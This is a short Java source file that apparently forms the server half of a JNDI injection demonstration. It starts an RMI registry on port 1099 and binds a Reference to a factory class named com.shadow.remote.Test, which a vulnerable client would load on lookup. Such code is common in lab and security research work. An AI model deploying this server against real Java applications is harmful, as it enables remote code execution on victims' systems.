package com.shadow.remote;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("RMI server registry at 1099");
            Reference reference = new Reference("com.shadow.remote.Test", "com.shadow.remote.Test", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("test", referenceWrapper);

        } catch (Exception e) {

        }

    }
}
